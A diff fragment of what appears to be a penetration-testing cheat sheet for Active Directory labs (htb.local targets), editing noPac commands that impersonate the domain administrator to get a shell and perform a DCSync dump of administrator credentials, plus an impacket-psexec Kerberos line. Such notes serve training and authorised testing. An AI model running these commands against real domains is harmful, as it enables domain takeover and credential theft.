@@ -1647,7 +1647,7 @@ impacket-psexec -k -no-pass resourced.local/administrator@DC01.resourced.local
 ```
 
 #### nopac
-```powershell
+```bash
 cd /opt/noPac
 source ./venv/bin/activate
 
@@ -1655,10 +1655,10 @@ source ./venv/bin/activate
 python3 scanner.py htb.local/svc_test:testpass -dc-ip 172.16.5.5 -use-ldap
 
 #psexec
-python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host DC01 -shell --impersonate administrator -use-ldap
 
 # DCSync
- python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user htb.local/administrator
+ python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user htb.local/administrator
 ```
 
 ### ADCS
